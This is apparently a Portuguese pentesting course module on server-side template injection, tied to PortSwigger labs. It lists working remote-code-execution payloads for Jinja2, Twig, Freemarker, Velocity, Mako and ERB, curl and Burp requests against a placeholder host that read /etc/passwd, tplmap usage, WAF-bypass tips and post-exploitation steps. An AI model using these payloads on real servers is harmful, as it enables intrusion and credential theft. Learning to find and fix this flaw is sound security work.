# 🧩 09. SSTI — Server-Side Template Injection

> Se a aplicação insere seu input direto em um template, você pode executar código arbitrário no servidor.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 60min | ⭐⭐⭐ Avançado | `curl, Burp Repeater, tplmap` |

</div>

---

## 🎓 Por que isso importa?

SSTI (Server-Side Template Injection) ocorre quando a aplicação **concatena input do usuário com um template** ao invés de usar os dados de forma segura. Isso permite que o atacante **escape do template e execute código arbitrário** no servidor.

**Analogia:** Imagine que você preenche um formulário e o funcionário cola sua resposta direto em um script do computador. Se você escrever `; rm -rf /`, o script executa.

**Impacto real:**
- **RCE direto** — executar comandos no servidor
- Ler arquivos sensíveis (`/etc/passwd`, configurações)
- Acessar rede interna (SSRF via template)
- DoS (billion laughs, loops infinitos)

**PortSwigger:** 7 labs dedicados (Practitioner + Expert)

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| HTTP basics | Sim | Módulo 00 |
| Burp Suite (Repeater) | Sim | Arquivo 01 deste módulo |
| Syntax básica de templates (Jinja2, Twig) | Sim | Este arquivo explica |

---

## 🎯 Quando usar SSTI

- Quando o input do usuário aparece **refletido na resposta** como parte de template
- Para testar: `{{7*7}}` → se retornar `49`, é SSTI
- Campos de busca, parâmetros de URL, formularios
- Templates de email personalizados
- Geração de páginas dinâmicas

---

## 🔄 Como funciona na prática

```
┌──────────────┐         ┌──────────────────┐
│   Atacante   │ ──input─►│   App Web        │
│   {{7*7}}    │         │  (concatena)     │
└──────────────┘         └──────────────────┘
                                │
                                ▼
                         ┌──────────────┐
                         │  Template    │
                         │  Engine      │
                         │              │
                         │  Olá, {{7*7}}│
                         │  → Olá, 49   │
                         └──────────────┘
                                │
                                ▼
                         ┌──────────────┐
                         │  Exploit:    │
                         │  {{config}}  │
                         │  → dump de   │
                         │  configuração │
                         └──────────────┘
```

---

## 📋 Detecção de Template Engine

### Teste Universal

```bash
# Enviar expressão matemática
{{7*7}}        → 49 = Jinja2, Twig, Freemaker
${7*7}         → 49 = Mako, ERB, Freemarker
#{7*7}         → 49 = Thymeleaf
<%= 7*7 %>     → 49 = ERB (Ruby)
{{7*'7'}}      → 7777777 = Jinja2 (multiplicação de string)
```

### Identificar Engine por Comportamento

| Input | Output | Engine |
|-------|--------|--------|
| `{{7*7}}` | `49` | Jinja2 / Twig |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `${7*7}` | `49` | Freemarker / Mako |
| `#{7*7}` | `49` | Thymeleaf |
| `<%= 7*7 %>` | `49` | ERB |
| `{{config}}` | `[object Object]` | Jinja2 (Flask) |
| `{{''.__class__.__mro__[1].__subclasses__()}}` | Lista de classes | Jinja2 (RCE) |

---

## 📝 Payloads por Template Engine

### Jinja2 (Flask/Python)

```bash
# Detecção
{{7*7}}

# Ler configuração
{{config}}
{{config.items()}}
{{self.__dict__}}

# Acceso a objetos
{{request.environ}}
{{request.args}}

# RCE via os.popen
{{''.__class__.__mro__[1].__subclasses__()}}
# Encontrar <class 'os._wrap_close'> (posição varia)
# Ex: posição 132
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

# RCE simplificado (se WSGI disponível)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via request
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app.config'].get('SECRET_KEY')}}
```

### Twig (PHP)

```bash
# Detecção
{{7*7}}

# Self referência
{{_self}}

# Accesso a variáveis
{{app}}

# RCE
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
# Ou
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

### Freemarker (Java)

```bash
# Detecção
${7*7}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

# Ou via objectConstructor
<#assign classloader=object.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
```

### Velocity (Java)

```bash
# Detecção
${7*7}

# RCE
#set($cmd="id")
#set($proc=$class.forName("java.lang.Runtime").getRuntime().exec($cmd))
#set($is=$proc.getInputStream())
#set($scanner=$class.forName("java.util.Scanner").new($is,"UTF-8").useDelimiter("\\A"))
#if($scanner.hasNext())
  $scanner.next()
#end
```

### Mako (Python)

```bash
# Detecção
${7*7}

# RCE
<%
import os
x = os.popen('id').read()
%>
${x}
```

### ERB (Ruby)

```bash
# Detecção
<%= 7*7 %>

# RCE
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").readlines %>
```

---

## 📝 Exemplos Práticos

### Exemplo 1: Detecção Básica

```bash
# Testar SSTI em parâmetro de busca
curl "http://target.com/search?q={{7*7}}"

# Output se SSTI existe:
# <h2>Resultados para: 49</h2>

# Se retornar "49" → confirmado!
```

### Exemplo 2: RCE via Jinja2

```bash
# 1. Confirmar SSTI
curl "http://target.com/page?name={{7*7}}"
# Output: 49

# 2. Enumerar subclasses
curl "http://target.com/page?name={{''.__class__.__mro__[1].__subclasses__()}}"
# Output: [<class 'type'>, <class 'weakref'>, ... <class 'os._wrap_close'> ...]

# 3. Encontrar posição de os._wrap_close (ex: 132)
# 4. Executar comando
curl "http://target.com/page?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}"
# Output: uid=33(www-data) gid=33(www-data)
```

### Exemplo 3: RCE via Twig (PHP)

```bash
# 1. Confirmar SSTI
curl "http://target.com/page?name={{7*7}}"
# Output: 49

# 2. RCE via Twig filter
curl "http://target.com/page?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
# Output: uid=33(www-data)

# 3. Ler arquivos
curl "http://target.com/page?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /etc/passwd')}}"
```

### Exemplo 4: Usando Burp Repeater

```bash
# 1. Interceptar request com parâmetro
# 2. Enviar para Repeater (Ctrl+R)
# 3. Testar SSTI:

GET /page?name={{7*7}} HTTP/1.1
Host: target.com

# 4. Response: 49 → SSTI confirmado
# 5. Escalar para RCE:

GET /page?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}} HTTP/1.1
Host: target.com

# 6. Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Exemplo 5: Usando tplmap

```bash
# Instalar tplmap
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt

# Detectar SSTI
python3 tplmap.py -u "http://target.com/page?name=test"

# Output:
# [+] Jinja2
# [+] Template engine: Jinja2
# [+] RCE: YES

# Executar comando
python3 tplmap.py -u "http://target.com/page?name=test" --os-cmd "id"

# Ler arquivo
python3 tplmap.py -u "http://target.com/page?name=test" --file-read /etc/passwd
```

---

## 🔄 Fluxo de Teste SSTI

```
┌─────────────────────────────────────────────────────────┐
│  1. DETECTAR TEMPLATE ENGINE                             │
│     - {{7*7}} → 49 = Jinja2/Twig                        │
│     - ${7*7} → 49 = Freemarker/Mako                     │
│     - <%= 7*7 %> → 49 = ERB                             │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  2. EXPLORAR OBJETOS DISPONÍVEIS                        │
│     - {{config}} (Jinja2)                                │
│     - {{_self}} (Twig)                                   │
│     - Identificar classe para RCE                        │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  3. ESCALAR PARA RCE                                     │
│     - Jinja2: os.popen via subclasses                    │
│     - Twig: system() via filter                          │
│     - Freemarker: Execute?new()                          │
│     - ERB: system() ou backticks                         │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  4. POST-EXPLOITATION                                    │
│     - Ler /etc/passwd, configurações                     │
│     - Buscar credenciais em configs                      │
│     - Conectar a bancos de dados internos                │
│     - Escalar privilegios                               │
└─────────────────────────────────────────────────────────┘
```

---

## ❌ Erros Comuns

| Erro | Solução |
|------|---------|
| "{{7*7}} retorna 7*7" | Não é template injection — pode ser XSS |
| "RCE não funciona" | Posição da classe varia → enumerar subclasses primeiro |
| "tplmap não detecta" | Testar manualmente com payloads básicos |
| "Payload muito longo" | Encurtar via variable assignment ou filter chaining |
| "WAF bloqueia" | Encoding: URL encode, HTML encode, case variation |
| "Não sei o engine" | Testar todos: {{}}, ${}, <%= %> |

---

## 📋 Cheat Sheet Rápido

### Detecção (copiar e colar)

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

### RCE Rápido

```bash
# Jinja2 (Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# ERB (Ruby)
<%= system("id") %>

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic) | Jinja2 básico | 15min |
| 2 | PortSwigger | [Basic SSTI (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-via-documentation) | SSTI via documentação | 15min |
| 3 | PortSwigger | [SSTI using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation) | Identificar engine | 15min |
| 4 | PortSwigger | [SSTI in unknown language](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit) | Engine desconhecida | 20min |
| 5 | PortSwigger | [SSTI with info disclosure](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects) | Information disclosure | 15min |
| 6 | PortSwigger | [SSTI in sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment) | Sandbox escape | 30min |
| 7 | PortSwigger | [SSTI with custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit) | Custom RCE | 30min |

---

## 📚 Referências

- [PortSwigger — SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger — SSTI Labs](https://portswigger.net/web-security/server-side-template-injection/exploiting)
- [HackTricks — SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [tplmap — SSTI exploitation tool](https://github.com/epinna/tplmap)
- [OWASP — SSTI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Detectar template injection com `{{7*7}}` e variações
- [ ] Identificar o template engine (Jinja2, Twig, Freemarker, ERB, Mako)
- [ ] Enumerar objetos e classes disponíveis no template
- [ ] Executar RCE via Jinja2 (Flask/Python)
- [ ] Executar RCE via Twig (PHP)
- [ ] Executar RCE via outros engines (Freemarker, ERB, Velocity)
- [ ] Usar tplmap para automatizar exploração
- [ ] Bypassar proteções básicas de SSTI
- [ ] Completar todos os labs PortSwigger de SSTI
